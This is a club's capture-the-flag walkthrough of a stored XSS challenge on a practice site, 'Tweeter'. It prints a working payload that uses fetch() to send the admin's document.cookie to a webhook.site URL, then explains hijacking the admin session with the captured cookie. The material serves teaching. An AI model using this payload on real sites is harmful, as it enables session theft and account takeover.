# XSS on Tweeter

Thanks for coming to our first meeting! We hope you learned something, even if you didn't get to solve the challenge during the meeting. Below is a walkthrough of how to find and exploit the XSS vulnerability in Tweeter, and hopefully this makes a bit more clear what's happening in an XSS attack.

## Finding the vulnerability
The website doesn't have too much functionality: you can sign up, log in, make posts, change your password, and edit your bio. Testing for XSS is essentially just putting `<script>alert(document.domain)</script>` into all the fields you can. In this case, the vulnerable field is the user bio, and the payload is triggered when visiting your profile.

## Building the exploit
Now that we can execute JavaScript, we need a way to log in as the admin. The website distinguishes users by their cookies, so we just need to steal the admin's cookies and set our cookies to be the same.

In JavaScript, website cookies can be accessed through the `document.cookie` property, which you can read more about [here](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie).

We also need some way to send the cookies back to us, since we don't have access to the admin's computer. This can be done by sending a request with the admin's cookies to somewhere that lets us monitor requests, such as webhook.site. The payload for this is below:
```html
<script>
	fetch(
		"https://webhook.site/443b7e1e-bd3f-4e38-9976-9da3abe33f11?cookies=" +
		encodeURIComponent(document.cookie))
</script>
```
We can break this down as follows:
- The first line opens a script tag, which lets us execute JavaScript code.
- The second line calls the `fetch` function, which sends a request to the provided URL. More info [here](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch).
- The third line is the URL of our webhook, with `?cookies=` added to the end. The question mark denotes the start of the query parameters, where we can put our cookies. Then `cookies=` starts a parameter with the name `cookies`.
- The fourth line encodes the value `document.cookie` to be put in the URL parameter.

# Running the Exploit
We put the payload above in our bio and send the link to our profile to the admin. When the admin visits the link, the payload will execute and send a request which will show up in our webhook.

Inspecting the request in the webhook.site panel, we can see the value of the `cookie` query parameter is `user=YSH+uCoYHrhxCYY9O6%2FrhimfpoLULLQ7cCVngV4AD24%3Dadmin`. Recall that cookies are of the form `key=value`, so the admin's cookie is `YSH+uCoYHrhxCYY9O6%2FrhimfpoLULLQ7cCVngV4AD24%3Dadmin`.

After setting your user cookie to the admin's cookie (instructions for [Chrome](https://developer.chrome.com/docs/devtools/application/cookies/) and [Firefox](https://firefox-source-docs.mozilla.org/devtools-user/storage_inspector/cookies/index.html)) and reloading, you'll be logged in as the admin. Now you can head over to the "Manage Users" link and give yourself Blue.
